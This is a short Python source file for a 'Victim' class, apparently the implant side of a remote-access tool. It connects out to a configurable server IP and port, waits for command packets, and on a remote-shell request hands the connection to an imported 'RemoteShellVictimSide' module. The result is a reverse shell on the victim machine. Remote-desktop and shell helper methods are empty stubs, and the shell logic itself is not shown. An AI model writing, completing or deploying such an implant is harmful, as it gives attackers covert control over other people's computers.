from socket import socket, AF_INET, SOCK_STREAM

from src.modlues.protocols.general import GeneralPacketType
from src.modlues.protocols.protocol import HandelPacket, Packet, PacketType
from src.modlues.remote_shell.victim_rsh import RemoteShellVictimSide


class Victim:

    def __init__(self, server_ip, server_port):
        self.SERVER_IP = server_ip
        self.SERVER_PORT = server_port
        self.ADDR = (self.SERVER_IP, self.SERVER_PORT)
        self.victim = socket(AF_INET, SOCK_STREAM)
        self.connected = True

    def main(self):
        self.__connect()
        while self.connected:
            packet = HandelPacket.recv_packet(self.victim)
            self.handle(packet)

    def handle(self, packet: Packet):
        if packet.packet_type == PacketType.GENERAL.value and packet.packet_sub_type == GeneralPacketType.CONNECT_RSH.value:
            RemoteShellVictimSide(self.victim).main()

    def __connect(self):
        self.victim.connect(self.ADDR)

    def __on_connect(self, conn, addr):
        pass

    def __start_remote_desktop(self):
        pass

    def __start_remote_shell(self):
        pass
